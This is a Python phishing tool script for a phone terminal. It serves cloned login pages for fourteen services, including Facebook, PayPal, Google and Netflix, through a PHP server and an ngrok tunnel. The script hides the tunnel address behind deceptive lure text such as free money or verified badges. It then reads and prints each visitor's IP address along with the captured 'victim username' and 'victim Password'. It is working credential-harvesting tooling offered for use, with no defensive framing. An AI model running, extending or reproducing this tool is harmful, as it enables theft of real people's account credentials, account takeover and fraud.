import os,json,time,sys
import json
import requests
os.system("pkg install php")
os.system('clear')
os.system('lolcat calar.py')
count=0
while count <9999999:
	   username = input('\033[1;95mEnter username:\033[1;96m  ')
	   print()
	   password = input('\033[1;95mEnter password:\033[1;96m  ')
	   if password=='4b1r' and username=='ABIRHOSSAIN':
	       print('Access granted')
	       os.system("xdg-open https://facebook.com/Abir-Hossain-104247341997068/?substory_index=0")
	       break
	   else:
   	    print('\033[1;94m Access denied. Try again.')
   	    count += 1
   	    print("			\033[1;91mFor User & Password Contact With Owner")
   	    os.system("xdg-open https://facebook.com/Abir-Hossain-104247341997068/?substory_index=0")
def slowprint(s):
 	  for c in s + '\n':
 	      sys.stdout.write(c)
 	      sys.stdout.flush()
 	      time.sleep(0.0006/ 100)
blue= '\033[1;94m'
lightblue = '\033[1;94m'
red = '\033[1;91m'
yellow = '\033[1;93m'
green = '\033[1;32m'
cyan  = "\033[1;96m"
white="\033[1;97m"
os.system('clear')
os.system('lolcat A-PHIS.py')
os.system("chmod +x Abir/ngrok*")
os.system("killall ngrok> /dev/null 2>&1 || killall ngrok> /dev/null 2>&1")
os.system("killall php> /dev/null 2>&1")
Abirhossain=str(input(red+"\n[★] Select Your Option : "+yellow))

if Abirhossain=="1" or Abirhossain=="01":
	website="facebook"
	mask='blue-verified-badge-for-facebook-free'
elif Abirhossain=="2" or Abirhossain=="02":
	website="github"
	mask='get-free-github-star'
elif Abirhossain=="3" or Abirhossain=="03":
	website="instagram"
	mask='get-unlimited-followers-for-instagram'
elif Abirhossain=="4" or Abirhossain=="04":
	website="google"
	mask='get-unlimited-google-drive-free'
elif Abirhossain=="5" or Abirhossain=="05":
	website="gitlab"
	mask='gitlab-sinup'
elif Abirhossain=="6" or Abirhossain=="06":
	website="Spotify"
	mask='get-a-premium-plan-for-spotify-free'
elif Abirhossain=="7" or Abirhossain=="07":
	website="netflix"
	mask='upgrade-your-netflix-plan-free'
elif Abirhossain=="8" or Abirhossain=="08":
	website="tiktok"
	mask='tiktok-free-liker'
elif Abirhossain=="9" or Abirhossain=="09":
	website="yahoo"
	mask='grab-mail-from-anyother-yahoo-account-free'
elif Abirhossain=="10" or Abirhossain=="010":
	website="paypal"
	mask='get-500-usd-free-to-your-acount'
elif Abirhossain=="11":
	website="snapchat"
	mask='view-locked-snapchat-accounts-secretly'
elif Abirhossain=="12":
	website="messanger"
	mask='get-free-dollar-from-facebook'
elif Abirhossain=="13":
	website="fb_security"
	mask='security-alert-login-your-id'
elif Abirhossain=="14":
	website="twitter"
	mask='get-twitter-blue-badge-varification'
else:
	os.system("xdg-open https://www.facebook.com/profile.php?id=100051548076449")
	os.system("python AH-PHISER.py")
os.system("clear")
os.system("cd site/"+website+"/ && php -S 127.0.0.1:8080> /dev/null 2>&1 &")
os.system("./Abir/ngrok http 127.0.0.1:8080> /dev/null 2>&1 &")
os.system ("clear")
os.system ("lolcat calar.py")
print(cyan+'['+white+'+'+cyan+']' +green+' Starting php Server...')
time.sleep(5)
print()
print(cyan+'['+white+'+'+cyan+']' +green+' Starting Ngrok Server...')
time.sleep(5)
url = "http://localhost:4040/api/tunnels/"
res = requests.get(url)
res_unicode = res.content.decode("utf-8")
res_json = json.loads(res_unicode)
for i in res_json["tunnels"]:
    if i['name'] == 'command_line':
        pr=i['public_url']
try:
    prop=pr
    oldurl = mask+'@'+prop
    newurl = oldurl.replace('https://','').rsplit(" ", 1)[0]
except:
	print(yellow+'['+white+'×'+yellow+']' +red+' Error Link Not Genarated Try Agin')
	exit()
print()
os.system('clear')
os.system('lolcat calar.py')
print()
print(cyan+'Your Link Is : '+green+'https://'+newurl)
print()
print("\033[1;95m       if you face any error plz restart this tool again")
print()
print()
while True:
	if os.path.isfile("site/"+website+"/ip.txt")==True:
		jop=open("site/"+website+"/ip.txt","r")
		ip2=jop.readline()
		ip=jop.readline().strip("IP:")
		print("\n [√]Someone Visited the Site ip address: "+ip)
		jop.close()
		os.system("rm -rf site/"+website+"/ip.txt")
	if os.path.isfile("site/"+website+"/usernames.txt")==True:
		abir=open("site/"+website+"/usernames.txt","r")
		Ah=abir.readline()
		rioy=int(Ah.find("Username:"))
		sop=int(Ah.find("Pass:"))
		print("\t"+red+"victim username : "+Ah[rioy+9:sop])
		print("\t"+red+"victim Password : "+Ah[sop+5:])
		abir.close()
		os.system("rm -rf site/"+website+"/usernames.txt")
